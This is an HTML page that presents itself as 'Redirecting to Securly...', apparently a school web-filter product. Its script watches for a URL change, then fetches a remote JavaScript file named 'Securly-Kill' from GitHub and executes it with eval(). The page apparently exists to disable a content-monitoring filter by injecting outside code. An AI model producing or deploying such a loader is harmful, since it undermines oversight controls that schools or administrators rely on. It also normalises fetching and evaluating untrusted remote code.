<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Redirect and Execute Script</title>
    <script>
    // URL of the external script to inject
    const externalScriptUrl = "https://raw.githubusercontent.com/zek-c/Securly-Kill-V111/main/kill.js";

    // Function to load and execute the external script
    function loadExternalScript(url) {
        fetch(url)
            .then(response => response.text())
            .then(script => {
                console.log("Injecting external script...");
                eval(script); // Execute the script content
            })
            .catch(error => console.error("Failed to load the external script:", error));
    }

    // Monitor the current URL for changes
    const currentUrl = window.location.href;
    const checkForRedirect = setInterval(() => {
        if (window.location.href !== currentUrl) {
            clearInterval(checkForRedirect); // Stop monitoring
            console.log("Redirect detected! Executing script on redirected page...");
            loadExternalScript(externalScriptUrl); // Inject the external script
        }
    }, 100); // Check every 100ms
    </script>
</head>
<body>
    <h1>Redirecting to Securly...</h1>
</body>
</html>
